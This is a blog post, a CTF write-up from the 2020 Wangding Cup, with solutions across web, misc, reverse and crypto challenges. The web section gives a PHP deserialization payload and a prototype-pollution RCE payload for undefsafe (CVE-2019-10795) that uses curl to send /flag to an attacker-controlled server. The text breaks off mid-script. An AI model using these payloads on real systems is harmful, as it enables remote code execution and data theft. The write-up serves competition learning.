<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>网鼎杯2020-青龙组-部分WP | xiaoZ's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><meta name="generator" content="Hexo 4.1.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">网鼎杯2020-青龙组-部分WP</h1><a id="logo" href="/.">xiaoZ's Blog</a><p class="description">Try My Best</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">网鼎杯2020-青龙组-部分WP</h1><div class="post-meta">May 13, 2020<span> | </span><span class="category"><a href="/categories/CTF-writeup/">CTF_writeup</a></span></div><a class="disqus-comment-count" data-disqus-identifier="2020/05/13/网鼎杯2020-青龙组-部分WP/" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/#disqus_thread"></a><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AreUSerialz"><span class="toc-number">1.1.</span> <span class="toc-text">AreUSerialz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Notes"><span class="toc-number">1.2.</span> <span class="toc-text">Notes</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#签到"><span class="toc-number">2.1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#虚幻"><span class="toc-number">2.2.</span> <span class="toc-text">虚幻</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">3.</span> <span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bang"><span class="toc-number">3.1.</span> <span class="toc-text">Bang</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Singal"><span class="toc-number">3.2.</span> <span class="toc-text">Singal</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">4.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#you-raise-me-up"><span class="toc-number">4.1.</span> <span class="toc-text">you raise me up</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#boom"><span class="toc-number">4.2.</span> <span class="toc-text">boom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ya"><span class="toc-number">4.3.</span> <span class="toc-text">easy_ya</span></a></li></ol></li></ol></div></div><div class="post-content"><p>一次体验不太好的比赛，web题环境容易崩，所以做着做着搞其他题去了，不过也还好整出点题目。但是可能这比赛py太多，最后还是没能进线下。</p>
<h2 id="Web">Web</h2>
<h3 id="AreUSerialz">AreUSerialz</h3>
<p>算是一个简单的反序列化，主要是类里面用了protected，所以需要做一下绕过。题目给出了源码，主要是对is_valid的绕过。在is_valid函数中，会把protected类型的属性的序列化字符串中的不可见字符\00筛掉。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();       </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $res = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (string)$_GET[<span class="string">'str'</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最开始做这题一直在想着各种构造payload bypass，但结果绕了半天发现可以直接改public利用弱类型就可以拿到文件了。Payload如下：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">?str=O:<span class="number">11</span>:%<span class="number">22</span>FileHandler%<span class="number">22</span>:<span class="number">3</span>:&#123;s:<span class="number">2</span>:%<span class="number">22</span>op%<span class="number">22</span>;i:<span class="number">2</span>;s:<span class="number">8</span>:%<span class="number">22f</span>ilename%<span class="number">22</span>;s:<span class="number">8</span>:%<span class="number">22f</span>lag.php%<span class="number">22</span>;s:<span class="number">1</span>:%<span class="number">22</span>%<span class="number">22</span>&#125;</span><br></pre></td></tr></table></figure>
<p>这里因为要读取文件，所以要让$op等于2，直接利用弱类型即可。</p>
<h3 id="Notes">Notes</h3>
<p>这题在比赛的时候搞了半天，发现是<a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">CVE-2019-10795 unsafe原型链污染</a>，但是不知道为什么一直弹不回flag。后面自己再复现的时候就可以了…问了下其他师傅说可能是这次比赛docker的问题，玄学。</p>
<p>题目给出了源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var path &#x3D; require(&#39;path&#39;);</span><br><span class="line">const undefsafe &#x3D; require(&#39;undefsafe&#39;);</span><br><span class="line">const &#123; exec &#125; &#x3D; require(&#39;child_process&#39;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var app &#x3D; express();</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner &#x3D; &quot;whoknows&quot;;</span><br><span class="line">        this.num &#x3D; 0;</span><br><span class="line">        this.note_list &#x3D; &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        this.note_list[(this.num++).toString()] &#x3D; &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r &#x3D; &#123;&#125;</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.author&#39;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#39;.raw_note&#39;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var notes &#x3D; new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;this is nobody&#39;s first note&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.set(&#39;views&#39;, path.join(__dirname, &#39;views&#39;));</span><br><span class="line">app.set(&#39;view engine&#39;, &#39;pug&#39;);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;));</span><br><span class="line">app.use(express.static(path.join(__dirname, &#39;public&#39;)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#39;index&#39;, &#123; title: &#39;Notebook&#39; &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.route(&#39;&#x2F;add_note&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#39;mess&#39;, &#123;message: &#39;please use POST to add a note&#39;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let author &#x3D; req.body.author;</span><br><span class="line">        let raw &#x3D; req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#39;&#x2F;edit_note&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id &#x3D; req.body.id;</span><br><span class="line">        let author &#x3D; req.body.author;</span><br><span class="line">        let enote &#x3D; req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#39;&#x2F;delete_note&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#39;mess&#39;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id &#x3D; req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#39;mess&#39;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#39;&#x2F;notes&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q &#x3D; req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) &#x3D;&#x3D;&#x3D; &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note &#x3D; notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note &#x3D; notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#39;note&#39;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&#39;&#x2F;status&#39;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands &#x3D; &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#39;&#x2F;bin&#x2F;bash&#39;&#125;, (err, stdout, stderr) &#x3D;&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(&#96;stdout: $&#123;stdout&#125;&#96;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#39;OK&#39;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#39;Sorry cant find that!&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);</span><br><span class="line">  res.status(500).send(&#39;Something broke!&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const port &#x3D; 8080;</span><br><span class="line">app.listen(port, () &#x3D;&gt; console.log(&#96;Example app listening at http:&#x2F;&#x2F;localhost:$&#123;port&#125;&#96;))</span><br></pre></td></tr></table></figure>
<p>审计代码，发现在route函数中有一个commands数组，如果可以将代码传到这里则可以rce。这里参照上述所说CVE的利用，可以用edit_node去污染object,将payload注入，再访问status即可执行代码实现RCE。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">id=__proto__<span class="string">"."</span>autho<span class="string">r":"</span>curl http:xxx.xxx.xxx.xxx:<span class="number">7777</span> -F <span class="string">'file=@/flag'</span><span class="string">","</span>raw<span class="string">":"</span>test<span class="string">"&#125;</span></span><br></pre></td></tr></table></figure>
<p>在edit_note传入上述payload，访问status即可在vps中看到弹回的flag。</p>
<h2 id="Misc">Misc</h2>
<h3 id="签到">签到</h3>
<p>答题，答对15道题之后输入token，此时可以抓到一个请求flag.php的包，repeat一下就可以拿到flag</p>
<h3 id="虚幻">虚幻</h3>
<p>这次的Misc里最难受的一道题。压缩包打开之后是一个file文件，查看发现是png格式，改为png格式（36*12像素）：</p>
<p><img src="/image/202005_wdqinglong/1.png" alt=""></p>
<p>用Stegsolve处理，R、G、B的图分别为：</p>
<p><img src="/image/202005_wdqinglong/2.png" alt=""></p>
<p>可以发现，有图像的区域分别为31<em>10像素（R）、31</em>11像素（G）、31<em>10像素（B）以GBR的顺序，每次取31</em>1像素的一行，循环拼图可以得到一张图片</p>
<p><img src="/image/202005_wdqinglong/3.png" alt=""></p>
<p>而汉信码一般是这样的。</p>
<p><img src="/image/202005_wdqinglong/4.png" alt=""></p>
<p>可以发现整体的方向和四个角的方向都有所不对。把图像逆时针旋转90°，再把左下的定位标转到正确的方向：</p>
<p><img src="/image/202005_wdqinglong/5.png" alt=""></p>
<p>右上还有个7*9的空白区域需要修补，这个只能写脚本强行爆破……</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">im = Image.open(<span class="string">'xuhuan.png'</span>)</span><br><span class="line">width = im.size[<span class="number">0</span>]</span><br><span class="line">height = im.size[<span class="number">1</span>]</span><br><span class="line">print(im.size)</span><br><span class="line"></span><br><span class="line">black = im.getpixel((<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">white = im.getpixel((<span class="number">1</span>,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">14</span>,<span class="number">23</span>):</span><br><span class="line">        color = random.choice([black,white])</span><br><span class="line">        im.putpixel((x,y),color)</span><br><span class="line">        <span class="comment">#print(im.getpixel((x,y)))</span></span><br><span class="line">im.save(<span class="string">"save.png"</span>,<span class="string">"PNG"</span>)</span><br></pre></td></tr></table></figure>
<p>得到汉明码之后，在 <a href="http://www.efittech.com/hxdec.html" target="_blank" rel="noopener">http://www.efittech.com/hxdec.html</a> 上传得到结果.</p>
<h2 id="Re">Re</h2>
<h3 id="Bang">Bang</h3>
<p>直接找个root了的手机，用Xposed-ZjDroid脱下壳可以拿到dex文件，用dex2jar反编译可以找到flag。在脱壳后，使用Jeb 也可以直接分析源码得flag。脱壳可以参考<a href="https://zhuanlan.kanxue.com/article-422.htm" target="_blank" rel="noopener">这个</a></p>
<p><img src="/image/202005_wdqinglong/6.png" alt=""></p>
<h3 id="Singal">Singal</h3>
<p>main函数调用了vm_operad函数，从名字可以看出是虚拟机。拿py实现一下里面的功能，然后把判断语句丢进z3，就好了。z3是真的好用23333。下面是某位大佬的exp，毕竟web狗，做这个题目的时候写了好几个脚本慢慢算，太low了…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">code=<span class="string">b'\n\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00 \x00\x00\x00\x08\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00\x08\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00!\x00\x00\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x08\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\t\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00 \x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00Q\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00$\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x00\x00\x08\x00\x00\x00\x0b\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x02\x00\x00\x00\x08\x00\x00\x00\x02\x00\x00\x00%\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x006\x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00A\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00 \x00\x00\x00\x08\x00\x00\x00\x05\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00\x03\x00\x00\x00\x08\x00\x00\x00\x02\x00\x00\x00%\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\t\x00\x00\x00\x08\x00\x00\x00\x03\x00\x00\x00 \x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00A\x00\x00\x00\x08\x00\x00\x00\x0c\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00"\x00\x00\x00\x07\x00\x00\x00?\x00\x00\x00\x07\x00\x00\x004\x00\x00\x00\x07\x00\x00\x002\x00\x00\x00\x07\x00\x00\x00r\x00\x00\x00\x07\x00\x00\x003\x00\x00\x00\x07\x00\x00\x00\x18\x00\x00\x00\x07\x00\x00\x00\xa7\xff\xff\xff\x07\x00\x00\x001\x00\x00\x00\x07\x00\x00\x00\xf1\xff\xff\xff\x07\x00\x00\x00(\x00\x00\x00\x07\x00\x00\x00\x84\xff\xff\xff\x07\x00\x00\x00\xc1\xff\xff\xff\x07\x00\x00\x00\x1e\x00\x00\x00\x07\x00\x00\x00z\x00\x00\x00'</span></span><br><span class="line"></span><br><span class="line">code=[int.from_bytes(code[i:i+<span class="number">4</span>],<span class="string">'little'</span>)<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">114</span>*<span class="number">4</span>,<span class="number">4</span>)]</span><br><span class="line"></span><br><span class="line">flag=[BitVec(<span class="string">'s'</span>+str(i),<span class="number">8</span>)<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>)]</span><br><span class="line">oflag=[i <span class="keyword">for</span> i <span class="keyword">in</span> flag]</span><br><span class="line">solver=Solver()</span><br><span class="line">out=[]</span><br><span class="line">tmp=<span class="number">0</span></span><br><span class="line">o2=<span class="number">0</span></span><br><span class="line">fp=<span class="number">0</span></span><br><span class="line">v6=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">114</span>:</span><br><span class="line">	x=code[i]</span><br><span class="line">	<span class="keyword">if</span> x==<span class="number">1</span>:</span><br><span class="line">		out.append(tmp)</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">		fp+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">2</span>:</span><br><span class="line">		tmp = code[i + <span class="number">1</span>] + flag[fp] &amp;<span class="number">255</span></span><br><span class="line">		i += <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">3</span>:</span><br><span class="line">		tmp = flag[fp] - code[i + <span class="number">1</span>] &amp;<span class="number">255</span></span><br><span class="line">		i += <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">4</span>:</span><br><span class="line">		tmp = code[i + <span class="number">1</span>] ^ flag[fp];</span><br><span class="line">		i += <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">5</span>:</span><br><span class="line">		tmp = code[i + <span class="number">1</span>] * flag[fp];</span><br><span class="line">		i += <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">6</span>:</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">7</span>:</span><br><span class="line">		solver.add(out[o2]==code[i+<span class="number">1</span>])</span><br><span class="line">		i+=<span class="number">2</span></span><br><span class="line">		o2+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">8</span>:</span><br><span class="line">		flag[v6] = tmp;</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">		v6+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">10</span>:</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">11</span>:</span><br><span class="line">		tmp = flag[fp] - <span class="number">1</span>;</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> x==<span class="number">12</span>:</span><br><span class="line">		tmp = flag[fp] + <span class="number">1</span>;</span><br><span class="line">		i+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> solver.check():</span><br><span class="line">	m=solver.model()</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> oflag:</span><br><span class="line">		print(chr(m[i].as_long()),end=<span class="string">''</span>)</span><br><span class="line">	print()</span><br></pre></td></tr></table></figure>
<h2 id="Crypto">Crypto</h2>
<h3 id="you-raise-me-up">you raise me up</h3>
<p>解离散对数问题，求mod 2**512 的离散对数，直接暴力枚举，我自己用的是sagemath网站求的解，求出来用long_to_byte转一下就可以。后来请教了mcfx师傅，看了一下他的脚本，发现精妙多了，这里需要注意一个比较特殊的关系，n的值是个二次幂，即模数为二次幂，可以简化暴力破解过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m = <span class="number">391190709124527428959489662565274039318305952172936859403855079581402770986890308469084735451207885386318986881041563704825943945069343345307381099559075</span></span><br><span class="line">c = <span class="number">6665851394203214245856789450723658632520816791621796775909766895233000234023642878786025644953797995373211308485605397024123180085924117610802485972584499</span></span><br><span class="line"></span><br><span class="line">mod = <span class="number">2</span></span><br><span class="line">result = [<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> mod &lt; <span class="number">2</span>**<span class="number">512</span>:</span><br><span class="line">	temp = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> 